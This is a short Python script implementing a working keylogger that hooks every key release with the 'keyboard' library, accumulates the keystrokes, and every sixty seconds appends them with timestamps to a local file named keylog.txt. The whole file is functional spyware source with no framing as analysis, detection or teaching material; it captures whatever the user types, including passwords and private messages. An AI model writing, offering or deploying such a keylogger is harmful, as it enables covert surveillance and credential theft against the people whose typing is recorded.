import keyboard
from threading import Timer
from datetime import datetime

LOG_FILE = "keylog.txt"
REPORT_INTERVAL = 60  # seconds

class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            name = name.replace(" ", "_").upper()
        self.log += name

    def report(self):
        if self.log:
            with open(LOG_FILE, "a") as f:
                f.write(f"[{datetime.now()}] {self.log}\n")
            self.log = ""
        Timer(self.interval, self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    keylogger = Keylogger(REPORT_INTERVAL)
    keylogger.start()